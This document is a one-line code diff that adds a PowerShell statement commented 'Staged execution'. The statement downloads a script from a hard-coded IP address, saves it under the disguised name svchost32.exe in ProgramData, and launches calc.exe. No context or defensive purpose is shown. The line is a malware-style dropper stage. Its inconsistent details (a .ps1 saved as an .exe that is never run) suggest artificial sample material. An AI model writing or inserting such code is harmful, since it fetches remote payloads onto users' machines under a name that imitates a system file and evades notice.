@@ -1,0 +1,1 @@
+<# Staged execution #> $DownloadUrl = "http://198.51.100.208:8080/stage1.ps1"; $WorkingPath = 'C:\ProgramData\svchost32.exe'; $RequestTimeout = 128; Invoke-WebRequest -Uri $DownloadUrl -OutFile $WorkingPath -UseBasicParsing; Start-Process -FilePath "calc.exe"; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
